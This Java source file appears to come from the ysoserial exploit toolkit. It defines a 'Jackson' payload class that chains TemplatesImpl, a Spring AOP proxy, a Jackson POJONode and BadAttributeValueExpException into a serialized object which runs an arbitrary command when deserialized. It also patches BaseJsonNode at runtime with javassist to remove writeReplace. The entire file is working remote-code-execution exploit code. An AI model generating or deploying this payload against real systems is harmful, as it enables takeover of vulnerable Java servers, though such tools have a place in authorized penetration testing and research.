
package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
@Authors({Authors.ERR0R233})
public class Jackson implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception{
        Object templates = Gadgets.createTemplatesImpl(command);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);

        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, handler);

        //删除NodeJsonBean的writeReplace
        ClassPool p = ClassPool.getDefault();
        CtClass node = p.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod method = node.getDeclaredMethod("writeReplace");
        node.removeMethod(method);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        node.toClass(classLoader, null);

        POJONode pojoNode = new POJONode(proxy);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", pojoNode);

        return badAttributeValueExpException;
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Jackson.class, args);
    }
}

